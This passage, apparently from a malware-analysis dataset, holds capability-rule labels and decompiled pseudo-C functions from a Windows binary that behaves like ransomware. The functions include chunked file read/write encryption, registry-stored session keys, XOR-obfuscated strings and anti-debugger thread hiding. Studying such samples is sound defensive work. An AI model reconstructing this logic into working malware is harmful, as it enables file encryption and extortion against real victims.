do {\n            if (*piVar11 != *piVar13) {\n                *(iStack652 + 8) = *(iStack652 + 0x18);\n                uVar17 = *(iStack652 + 0x1c);\n                *(iStack652 + 0xc) = uVar17;\n                iVar9 = fcn.00407f50(*(iStack652 + 0x18), uVar17, 0x10, 0);\n                if (((*(iVar7 + 0x30) == 0) && (-1 < *(iVar7 + 0x1c))) &&\n                   ((0 < *(iVar7 + 0x1c) || (0x40000 < *(iVar7 + 0x18))))) {\n                    iVar9 = 0;\n                }\n                iVar12 = 0x10 - iVar9;\n                if (iVar9 < 1) {\n                    iVar12 = iVar9;\n                }\n                *(iVar7 + 0x40053) = *(iVar7 + 0x18) & 0xf;\n                if (((*(iVar7 + 0x30) == 0) && (-1 < *(iVar7 + 0x1c))) &&\n                   ((0 < *(iVar7 + 0x1c) || (0x40000 < *(iVar7 + 0x18))))) {\n                    *(iVar7 + 0x40053) = 0;\n                }\n                *(iVar7 + 0x40054) = *(iVar7 + 0x40044);\n                *(iVar7 + 0x40058) = *(iVar7 + 0x40048);\n                *(iVar7 + 0x4005c) = *(iVar7 + 0x4004c);\n                *(iVar7 + 0x40060) = *(iVar7 + 0x40050);\n                iVar9 = fcn.004184e0();\n                if (iVar9 == 0) {\n                    LOCK();\n                    *0x428420 = *0x428420 + -1;\n                    (*_sym.imp.ntdll.dll_NtClose)(*(iVar7 + 0x20));\n                    (*pcVar6)(iVar7);\n                    (*pcVar6)(uVar17);\n                }\n                *(iVar7 + 0x24) = 6;\n                iVar9 = (*_sym.imp.KERNEL32.dll_WriteFile)(*(iVar7 + 0x20), iVar7 + 0x34, iVar12 + 0x610, 0, iVar7);\n                goto code_r0x004184a2;\n            }\n            piVar11 = piVar11 + 1;\n            piVar13 = piVar13 + 1;\n            bVar15 = 3 < uStack672;\n            uStack672 = uStack672 - 4;\n        } while (bVar15);\n        goto code_r0x004184bb;\n    }\n    goto code_r0x004184c2;\ncode_r0x0041845e:\n    if (iVar9 == 6) {\n        iVar9 = 0x40000;\n        *(iStack652 + 0x24) = 1;\n        *(iStack652 + 8) = 0;\n        *(iStack652 + 0xc) = 0;\n        if ((*(iStack652 + 0x1c) < 1) && ((*(iStack652 + 0x1c) < 0 || (*(iStack652 + 0x18) < 0x40000)))) {\n            iVar9 = *(iStack652 + 0x18);\n        }\ncode_r0x00418495:\n        iVar9 = (*_sym.imp.KERNEL32.dll_ReadFile)(*(iStack652 + 0x20), iStack652 + 0x34, iVar9, 0, iStack652);\ncode_r0x004184a2:\n        if ((iVar9 == 0) && (*(in_FS_OFFSET + 0x34) != 0x3e5)) {\ncode_r0x004184bb:\n            LOCK();\n            *0x428420 = *0x428420 + -1;\ncode_r0x004184c2:\n            (*_sym.imp.ntdll.dll_NtClose)(*(iVar7 + 0x20));\n            (*pcVar6)(iVar7);\n            (*pcVar6)(unaff_ESI);\n        }\n    }\n    goto code_r0x004180c4;\n}\n",
        "token_count": 2770
    },
    "004184e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004184e0(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint var_b4h;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint var_a4h;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint var_94h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    var_4h = param_2;\n    fcn.00412920(&var_14h, 0x10);\n    if (*0x42842c == 0) {\n        fcn.004086f0(0x427960);\n        fcn.00408390(0x427fa0);\n        *0x42842c = 1;\n        iVar4 = fcn.004088f0(0x427960, fcn.00408260, 0x427fa0, &var_14h, 0x10);\n        iVar5 = *0x428424;\n    }\n    else {\n        iVar4 = fcn.00408800(0x427960, &var_14h, 0x10);\n        iVar5 = *0x428424;\n    }\n    if (iVar4 != 0) {\n        *0x428424 = iVar5;\n        return 0;\n    }\n    var_b4h = *(param_1 + 0x40034);\n    uStack180 = *(param_1 + 0x40038);\n    uStack176 = *(param_1 + 0x4003c);\n    uStack172 = *(param_1 + 0x40040);\n    var_a4h = *(param_1 + 0x40044);\n    uStack164 = *(param_1 + 0x40048);\n    uStack160 = *(param_1 + 0x4004c);\n    uStack156 = *(param_1 + 0x40050);\n    *0x428424 = iVar5;\n    fcn.004124d0(&var_94h, 0x4281a8, iVar5);\n    iVar5 = fcn.0040d800(0x428330, fcn.00408710, 0x427960, 0, iVar5 + 0x20, &var_b4h, param_2 + 0x34 + param_1);\n    if (iVar5 != 0) {\n        return 0;\n    }\n    iVar5 = 0x20;\n    puVar6 = &var_b4h;\n    do {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    puVar6 = 0x427aa0;\n    puVar7 = param_2 + 0x134 + param_1;\n    for (iVar5 = 0x140; uVar3 = *0x42600c,  uVar2 = *0x426008,  uVar1 = *0x426004,  iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    puVar6 = param_1 + 0x634 + var_4h;\n    *puVar6 = *0x426000;\n    puVar6[1] = uVar1;\n    puVar6[2] = uVar2;\n    puVar6[3] = uVar3;\n    return 1;\n}\n",
        "token_count": 858
    },
    "00418620": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00418620(void)\n\n{\n    uint *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint uVar4;\n    uint uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint8_t *puVar13;\n    int32_t iVar14;\n    ulong uVar15;\n    char *pcVar16;\n    uint uVar17;\n    uchar auStack1600 [880];\n    uchar auStack720 [548];\n    uchar auStack172 [12];\n    uchar auStack160 [12];\n    char acStack148 [52];\n    int32_t aiStack96 [5];\n    uint uStack76;\n    ushort uStack72;\n    uint8_t uStack70;\n    uint8_t uStack69;\n    ushort uStack68;\n    ushort uStack66;\n    ushort uStack64;\n    ushort uStack62;\n    ushort uStack60;\n    ushort uStack58;\n    ushort uStack56;\n    uchar uStack54;\n    uchar uStack53;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    int32_t iStack40;\n    int32_t iStack36;\n    uchar uStack32;\n    uchar uStack31;\n    uchar uStack30;\n    uchar uStack29;\n    char *pcStack28;\n    uchar uStack24;\n    uchar uStack23;\n    uchar uStack22;\n    uchar uStack21;\n    uint8_t *puStack20;\n    \n    iStack36 = (*_sym.imp.msvcrt.dll_malloc)(0x483);\n    bVar6 = false;\n    while( true ) {\n        uVar9 = 0;\n        uStack70 = *0x423d40;\n        uStack69 = *0x423d40 >> 8;\n        uStack68 = *0x423d40 >> 0x10;\n        uStack66 = *0x423d44;\n        uStack64 = *0x423d44 >> 0x10;\n        uStack62 = *0x423d48;\n        uStack60 = *0x423d48 >> 0x10;\n        uStack58 = *0x423d4c;\n        uStack56 = *0x423d4c >> 0x10;\n        uStack54 = 0x5d;\n        uStack53 = 0;\n        do {\n            (&uStack69)[uVar9] = (&uStack69)[uVar9] ^ uStack70;\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 0x10);\n        uStack53 = 0;\n        uVar17 = 0x80000001;\n        iVar10 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                           (0x80000001, &uStack69, 0, 0, 0, 0xf003f, 0, &uStack44, aiStack96);\n        if (iVar10 != 0) {\n            uVar9 = 0;\n            uStack76 = str.iI._f_a_fe_b._0_4_;\n            uStack72 = str.iI._f_a_fe_b._4_4_;\n            uStack70 = str.iI._f_a_fe_b._4_4_ >> 0x10;\n            uStack69 = str.iI._f_a_fe_b._4_4_ >> 0x18;\n            uStack68 = *0x423af8;\n            uStack66 = *0x423af8 >> 0x10;\n            uStack64 = *0x423afc;\n            uStack62 = *0x423afc >> 0x10;\n            uStack60 = 0x706;\n            uStack58 = 0x249;\n            uStack56 = 0x100c;\n            uStack54 = 0x1a;\n            uStack53 = 0;\n            do {\n                uStack76._0_1_ = str.iI._f_a_fe_b._0_4_;\n                puVar13 = &uStack76 + uVar9 + 1;\n                *puVar13 = *puVar13 ^ uStack76;\n                uVar9 = uVar9 + 1;\n            } while (uVar9 < 0x16);\n            uStack53 = 0;\n            fcn.0040f630(&uStack76 + 1, uVar17);\n            iVar11 = fcn.00418e60();\n            iVar10 = iStack36;\n            if (iVar11 == 0) {\n                return 0;\n            }\n            pcStack28 = 0x483;\n            iVar11 = fcn.00418c90();\n            if (iVar11 == 0) {\n                return 0;\n            }\n            goto code_r0x004188d9;\n        }\n        uStack48 = 3;\n        iStack40 = 0x500;\n        uStack22 = 0x5b;\n        uStack21 = 0x66;\n        puStack20 = 0x6c6c75;\n        iVar10 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(uStack44, &uStack21, 0, &uStack48, 0x427aa0, &iStack40);\n        uStack32 = 0x11;\n        uStack31 = 0x50;\n        iStack40 = 0x103;\n        uStack30 = 0x75;\n        uStack29 = 0x62;\n        pcStack28 = 0x63696c;\n        iVar11 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(uStack44, &uStack31, 0, &uStack48, iStack36, &iStack40);\n        if ((iVar10 == 0) && (iVar11 == 0)) break;\n        if ((aiStack96[0] != 2) || (bVar6)) {\n            iVar11 = fcn.00418e60();\n            iVar10 = iStack36;\n            if (iVar11 != 0) {\n                pcStack28 = 0x483;\n                iVar11 = fcn.00418c90();\n                pcVar8 = _sym.imp.ADVAPI32.dll_RegSetValueExA;\n                if (iVar11 != 0) {\n                    uStack22 = 0x28;\n                    uStack21 = 0x66;\n                    puStack20 = 0x6c6c75;\n                    (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(uStack44, &uStack21, 0, 3, 0x427aa0, 0x500);\n                    uStack24 = 0x6a;\n                    uStack23 = 0x50;\n                    uStack22 = 0x75;\n                    uStack21 = 0x62;\n                    puStack20 = 0x63696c;\n                    (*pcVar8)(uStack44, &uStack23, 0, 3, iVar10, 0x103);\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack44);\ncode_r0x004188d9:\n                    fcn.0040b4e0(auStack172);\n                    fcn.0040b4e0(auStack160);\n                    fcn.0040d7d0(0x428330, 0, 0);\n                    iVar11 = fcn.0040c0e0(auStack172, iVar10, 0x100);\n                    if (((iVar11 == 0) && (iVar10 = fcn.0040c0e0(auStack160, iVar10 + 0x100, 3),  iVar10 == 0)) &&\n                       (iVar10 = fcn.0040d720(0x428330, auStack172, 0, 0, 0, auStack160),  iVar10 == 0)) {\n                        fcn.004086f0(auStack720);\n                        fcn.00408390(auStack1600);\n                        fcn.004042a0(extraout_ECX, puStack20);\n                        uStack48 = fcn.00404210();\n                        fcn.00404df0(extraout_ECX_00, puStack20);\n                        pcStack28 = fcn.00404250();\n                        puStack20 = fcn.004053e0(extraout_ECX_01, puStack20);\n                        iVar10 = 0x281;\n                        puVar13 = puStack20;\n                        do {\n                            puVar13 = puVar13 + 1;\n                            *puVar13 = *puVar13 ^ *puStack20;\n                            iVar10 = iVar10 + -1;\n                        } while (iVar10 != 0);\n                        puStack20[0x282] = 0;\n                        fcn.00412570();\n                        pcVar16 = pcStack28;\n                        fcn.00412570();\n                        uVar15 = fcn.00412570();\n                        *0x428428 = uVar15 + (uVar15 >> 0x20) + 500;\n                        iVar10 = (*_sym.imp.msvcrt.dll_malloc)(*0x428428);\n                        *0x4281a4 = iVar10;\n                        fcn.004124f0(iVar10, 0, *0x428428);\n                        uVar15 = fcn.00412570();\n                        iStack40 = uVar15;\n                        fcn.004124d0(iVar10, uVar15 >> 0x20, iStack40);\n                        uStack52 = 0x32;\n                        iVar10 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(0x426000, 8, 4, acStack148, &uStack52);\n                        if (iVar10 != 0) {\n                            iVar11 = 0;\n                            iVar10 = 0;\n                            while( true ) {\n                                iVar14 = 0;\n                                cVar3 = acStack148[0];\n                                while (cVar3 != '\\0') {\n                                    cVar3 = acStack148[iVar14 + 1];\n                                    iVar14 = iVar14 + 1;\n                                }\n                                if (iVar14 <= iVar10) break;\n                                cVar3 = acStack148[iVar10];\n                                if ((cVar3 != ' ') && (cVar3 != '\\t')) {\n                                    acStack148[iVar11] = cVar3;\n                                    iVar11 = iVar11 + 1;\n                                }\n                                iVar10 = iVar10 + 1;\n                            }\n                            acStack148[iVar11] = '\\0';\n                            puVar12 = (*_sym.imp.USER32.dll_CharUpperA)(acStack148);\n                            iVar10 = iStack40;\n                            *0x428230 = *puVar12;\n                            *0x428234 = puVar12[1];\n                            *0x428238 = puVar12[2];\n                            *0x42823c = puVar12[3];\n                            uVar17 = puVar12[1];\n                            uVar4 = puVar12[2];\n                            uVar5 = puVar12[3];\n                            puVar1 = iStack40 + *0x4281a4;\n                            *puVar1 = *puVar12;\n                            puVar1[1] = uVar17;\n                            puVar1[2] = uVar4;\n                            puVar1[3] = uVar5;\n                            uStack52 = 0x32;\n                            iVar11 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(iStack36, 8, 4, acStack148, &uStack52)\n                            ;\n                            if (iVar11 != 0) {\n                                iVar14 = 0;\n                                iVar11 = 0;\n                                while( true ) {\n                                    iVar7 = 0;\n                                    cVar3 = acStack148[0];\n                                    while (cVar3 != '\\0') {\n                                        cVar3 = acStack148[iVar7 + 1];\n                                        iVar7 = iVar7 + 1;\n                                    }\n                                    if (iVar7 <= iVar11) break;\n                                    cVar3 = acStack148[iVar11];\n                                    if ((cVar3 != ' ') && (cVar3 != '\\t')) {\n                                        acStack148[iVar14] = cVar3;\n                                        iVar14 = iVar14 + 1;\n                                    }\n                                    iVar11 = iVar11 + 1;\n                                }\n                                acStack148[iVar14] = '\\0';\n                                puVar12 = (*_sym.imp.USER32.dll_CharUpperA)(acStack148);\n                                iVar14 = *0x4281a4;\n                                uVar17 = puVar12[1];\n                                uVar4 = puVar12[2];\n                                uVar5 = puVar12[3];\n                                puVar1 = iVar10 + 0x10 + *0x4281a4;\n                                *puVar1 = *puVar12;\n                                puVar1[1] = uVar17;\n                                puVar1[2] = uVar4;\n                                puVar1[3] = uVar5;\n                                iVar10 = iVar10 + 0x20;\n                                *0x428240 = *puVar12;\n                                *0x428244 = puVar12[1];\n                                *0x428248 = puVar12[2];\n                                *0x42824c = puVar12[3];\n                                iVar11 = 0;\n                                if (pcVar16 != NULL) {\n                                    cVar3 = *pcVar16;\n                                    while (cVar3 != '\\0') {\n                                        iVar11 = iVar11 + 1;\n                                        cVar3 = pcVar16[iVar11];\n                                    }\n                                }\n                                fcn.004124d0(iVar10 + iVar14, pcVar16, iVar11);\n                                iVar11 = 0;\n                                if (pcVar16 != NULL) {\n                                    cVar3 = *pcVar16;\n                                    while (cVar3 != '\\0') {\n                                        iVar11 = iVar11 + 1;\n                                        cVar3 = pcVar16[iVar11];\n                                    }\n                                }\n                                iVar10 = iVar10 + iVar11;\n                                iVar11 = 0;\n                                while (*0x428230 != '\\0') {\n                                    *0x428230 = *(iVar11 + 0x428231);\n                                    iVar11 = iVar11 + 1;\n                                }\n                                fcn.004124d0(*0x4281a4 + iVar10, 0x428230, iVar11);\n                                iVar11 = 0x428230;\n                                cVar3 = *0x428230;\n                                while (cVar3 != '\\0') {\n                                    pcVar16 = iVar11 + 1;\n                                    iVar11 = iVar11 + 1;\n                                    cVar3 = *pcVar16;\n                                }\n                                iVar11 = 0;\n                                while (*0x428230 != '\\0') {\n                                    *0x428230 = *(iVar11 + 0x428231);\n                                    iVar11 = iVar11 + 1;\n                                }\n                                iVar10 = iVar10 + iVar11;\n                                puVar13 = puStack20 + 1;\n                                if (puVar13 == NULL) {\n                                    iVar11 = 0;\n                                }\n                                else {\n                                    iVar11 = 0;\n                                    uVar2 = *puVar13;\n                                    while (uVar2 != 0) {\n                                        iVar11 = iVar11 + 1;\n                                        uVar2 = puVar13[iVar11];\n                                    }\n                                }\n                                iStack40 = iVar10;\n                                fcn.004124d0(*0x4281a4 + iVar10, puVar13, iVar11);\n                                *0x428428 = 0;\n                                if (puVar13 != NULL) {\n                                    uVar2 = *puVar13;\n                                    while (uVar2 != 0) {\n                                        *0x428428 = *0x428428 + 1;\n                                        uVar2 = puVar13[*0x428428];\n                                    }\n                                }\n                                *0x428428 = *0x428428 + iVar10;\n                                (*_sym.imp.msvcrt.dll_free)(iStack36);\n                                return 1;\n                            }\n                        }\n                    }\n                }\n            }\n            return 0;\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        bVar6 = true;\n    }\n    pcVar16 = \" Getting session keys from registry\";\n    uVar17 = puStack20;\n    fcn.00404090(\" Getting session keys from registry\");\n    uVar17 = fcn.004023c0(pcVar16, uVar17);\n    fcn.0040f630(uVar17, pcVar16);\n    iVar10 = iStack36;\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack44);\n    goto code_r0x004188d9;\n}\n",
        "token_count": 3714
    },
    "00419100": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004191a6)\n\nuint __cdecl fcn.00419100(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t *in_ECX;\n    uint32_t uVar2;\n    bool bVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_ch < 1) && ((arg_ch < 0 || (arg_8h < 0x600000)))) {\n        iVar1 = in_ECX[1] + (0xfffbffff < *in_ECX);\n        if (iVar1 < arg_ch) {\n            return 1;\n        }\n        if ((iVar1 <= arg_ch) && (*in_ECX + 0x40000 < arg_8h)) {\n            return 1;\n        }\n        return 0;\n    }\n    if ((arg_ch + -1 + (0x600000 < arg_8h) == 0) && (arg_8h - 0x600001 < 0x2bfffff)) {\n        iVar4 = fcn.00407e60(arg_8h - 0x180000, arg_ch - (arg_8h < 0x180000), 4, 0);\n        uVar2 = *in_ECX;\n        iVar5 = fcn.00407e60(uVar2, in_ECX[1], iVar4 + 0x40000);\n        if (iVar5 < 3) {\n            in_ECX[1] = in_ECX[1] + (iVar4 >> 0x20) + CARRY4(uVar2, iVar4);\n            *in_ECX = uVar2 + iVar4;\n            return 1;\n        }\n        *in_ECX = arg_8h - 0x40000;\n        in_ECX[1] = arg_ch - (arg_8h < 0x40000);\n        return 0;\n    }\n    if ((arg_ch + -1 + (0x3200000 < arg_8h) == 0) && (arg_8h + 0xfcdfffff < 0x31fffff)) {\n        iVar4 = fcn.00407e60(arg_8h - 0x200000, arg_ch - (arg_8h < 0x200000), 6, 0);\n        uVar2 = *in_ECX;\n        iVar5 = fcn.00407e60(uVar2, in_ECX[1], iVar4 + 0x40000);\n        if (iVar5 < 0) goto code_r0x00419314;\n        if (0xffffffff < iVar5) goto code_r0x004192f8;\n        bVar3 = iVar5 < 5;\n    }\n    else if ((arg_ch + -1 + (0x6400000 < arg_8h) == 0) && (arg_8h + 0xf9bfffff < 0x18ffffff)) {\n        iVar4 = fcn.00407e60(arg_8h - 0x380000, arg_ch - (arg_8h < 0x380000), 0xc, 0);\n        uVar2 = *in_ECX;\n        iVar5 = fcn.00407e60(uVar2, in_ECX[1], iVar4 + 0x40000);\n        if (iVar5 < 0) goto code_r0x00419314;\n        if (0xffffffff < iVar5) goto code_r0x004192f8;\n        bVar3 = iVar5 < 0xb;\n    }\n    else {\n        if (arg_ch < 0) {\n            return 1;\n        }\n        if ((arg_ch < 1) && (arg_8h < 0x1f400001)) {\n            return 1;\n        }\n        iVar4 = fcn.00407e60(arg_8h - 0xc80000, arg_ch - (arg_8h < 0xc80000), 0x30, 0);\n        uVar2 = *in_ECX;\n        iVar5 = fcn.00407e60(uVar2, in_ECX[1], iVar4 + 0x40000);\n        if (iVar5 < 0) goto code_r0x00419314;\n        if (0xffffffff < iVar5) goto code_r0x004192f8;\n        bVar3 = iVar5 < 0x2f;\n    }\n    if (!bVar3) {\ncode_r0x004192f8:\n        *in_ECX = arg_8h - 0x40000;\n        in_ECX[1] = arg_ch - (arg_8h < 0x40000);\n        return 0;\n    }\ncode_r0x00419314:\n    var_4h = iVar4 >> 0x20;\n    var_ch = iVar4;\n    in_ECX[1] = in_ECX[1] + var_4h + CARRY4(uVar2, var_ch);\n    *in_ECX = uVar2 + var_ch;\n    return 1;\n}\n",
        "token_count": 1162
    },
    "00419330": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00419330(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    int32_t in_FS_OFFSET;\n    uint uStack176;\n    uint uStack172;\n    code *pcStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uchar *puStack156;\n    uint uStack152;\n    uint uStack148;\n    code *pcStack144;\n    uint uStack140;\n    uint uStack136;\n    uint arglist;\n    uint uStack124;\n    uint uStack120;\n    uint8_t uStack94;\n    uint8_t uStack93;\n    ushort uStack92;\n    ushort uStack90;\n    ushort uStack88;\n    uint uStack86;\n    uint uStack82;\n    uint32_t uStack78;\n    uint uStack58;\n    uint uStack54;\n    uchar uStack50;\n    uint8_t uStack49;\n    ushort uStack48;\n    uint uStack46;\n    uint uStack42;\n    uint uStack38;\n    uchar uStack34;\n    uint uStack33;\n    uint uStack29;\n    uchar uStack25;\n    \n    iVar3 = fcn.00412a80();\n    if (iVar3 != 0) {\n        uVar5 = 0;\n        uStack58 = *0x423c40;\n        uStack54 = *0x423c44;\n        uStack50 = str.u___:_A._0_4_;\n        uStack49 = str.u___:_A._0_4_ >> 8;\n        uStack48 = str.u___:_A._0_4_ >> 0x10;\n        uStack46 = str.u___:_A._4_4_;\n        uStack42 = 0x343b3075;\n        uStack38 = 0x31303937;\n        uStack34 = 0;\n        do {\n            uStack58._0_1_ = *0x423c40;\n            (&stack0xffffffc7)[uVar5] = (&stack0xffffffc7)[uVar5] ^ uStack58;\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 0x17);\n        uStack34 = 0;\n        uStack120 = 0x41938d;\n        fcn.0040f630(&stack0xffffffc7, unaff_EDI);\n        *0x428430 = 1;\n    }\n    iVar3 = fcn.00418620();\n    if (iVar3 != 0) {\n        iVar3 = *(in_FS_OFFSET + 0x30);\n        uStack92 = iVar3;\n        uStack90 = iVar3 >> 0x10;\n        uStack120 = 0;\n        uStack124 = 0x1f0003;\n        arglist = 0x428228;\n        (*_sym.imp.ntdll.dll_NtCreateIoCompletion)();\n        uVar5 = 0;\n        uStack49 = str.yY_r._0_4_;\n        uStack48 = str.yY_r._0_4_ >> 8;\n        uStack46._1_3_ = *0x423bb4;\n        uStack46 = CONCAT31(uStack46._1_3_, str.yY_r._0_4_ >> 0x18);\n        uStack42._1_3_ = *0x423bb8;\n        uStack42 = CONCAT31(uStack42._1_3_, *0x423bb4 >> 0x18);\n        uStack38._1_3_ = *0x423bbc;\n        uStack38 = CONCAT31(uStack38._1_3_, *0x423bb8 >> 0x18);\n        uStack34 = *0x423bbc >> 0x18;\n        uStack33 = 0x1d181c0b;\n        uStack29 = 0x5757570a;\n        do {\n            (&stack0xffffffd0)[uVar5] = (&stack0xffffffd0)[uVar5] ^ uStack49;\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 0x17);\n        uStack25 = 0;\n        uStack136 = 0x41940d;\n        fcn.0040f630(&stack0xffffffd0, arglist);\n        pcVar2 = _sym.imp.ntdll.dll_NtSetInformationThread;\n        uVar5 = 0;\n        if (*(iVar3 + 100) != 0) {\n            do {\n                pcVar1 = _sym.imp.KERNEL32.dll_CreateThread;\n                uStack136 = 0;\n                uStack140 = 0;\n                pcStack144 = fcn.004180b0;\n                uStack148 = 0;\n                uStack152 = 0;\n                puStack156 = 0x419444;\n                iVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)();\n                if (iVar3 != -1) {\n                    puStack156 = NULL;\n                    iStack160 = 0;\n                    uStack164 = 0x11;\n                    uStack172 = 0x419454;\n                    pcStack168 = iVar3;\n                    (*pcVar2)();\n                }\n                puStack156 = &stack0xffffff84;\n                iStack160 = 0;\n                uStack164 = 0;\n                pcStack168 = fcn.004180b0;\n                uStack172 = 0;\n                uStack176 = 0;\n                iVar4 = (*pcVar1)();\n                if (iVar4 != -1) {\n                    (*pcVar2)(iVar4, 0x11, 0, 0);\n                }\n                iStack160 = 1 << (uStack164 & 0x1f);\n                (*pcVar2)(iVar3, 4, &stack0xffffff60, 4);\n                (*pcVar2)(iVar4, 4, &stack0xffffff50, 4);\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < *(unaff_ESI + 100));\n        }\n        uVar5 = 0;\n        uStack94 = str.xX17__X._0_4_;\n        uStack93 = str.xX17__X._0_4_ >> 8;\n        uStack92 = str.xX17__X._0_4_ >> 0x10;\n        uStack90 = str.xX17__X._4_4_;\n        uStack88 = str.xX17__X._4_4_ >> 0x10;\n        uStack86 = *0x423b58;\n        uStack82 = *0x423b5c;\n        uStack78 = 0x591c1d;\n        do {\n            (&stack0xffffffa3)[uVar5] = (&stack0xffffffa3)[uVar5] ^ uStack94;\n            uVar5 = uVar5 + 1;\n        } while (uVar5 < 0x12);\n        uStack78 = uStack78 & 0xffffff;\n        uStack136 = 0x4194ee;\n        fcn.0040f630(&stack0xffffffa3, arglist);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1629
    },
    "00419500": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00419500(uint param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uchar (*pauVar5) [16];\n    uint uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t in_FS_OFFSET;\n    uint var_238h;\n    uint var_230h;\n    uint var_228h;\n    uint32_t var_220h;\n    int32_t var_21ch;\n    uint *var_210h;\n    uint *var_20ch;\n    uint *var_208h;\n    uint *var_204h;\n    uint *var_200h;\n    uint *var_1fch;\n    uint *var_1f8h;\n    uint *var_1f4h;\n    uint *var_1f0h;\n    uint *var_1ech;\n    uint *var_1e8h;\n    uint *var_1e4h;\n    uint *var_1e0h;\n    uint *var_1dch;\n    uint *var_1d8h;\n    uint *var_1d4h;\n    uint *var_1d0h;\n    uint *var_1cch;\n    uint *var_1c8h;\n    uint *var_1c4h;\n    uint *var_1c0h;\n    uint *var_1bch;\n    uint *var_1b8h;\n    uint *var_1b4h;\n    uint *var_1b0h;\n    uint *var_1ach;\n    uint *var_1a8h;\n    uint *var_1a4h;\n    uint var_1a0h;\n    uint var_194h;\n    uint var_190h;\n    int32_t var_18ch;\n    uint ARG_1;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint 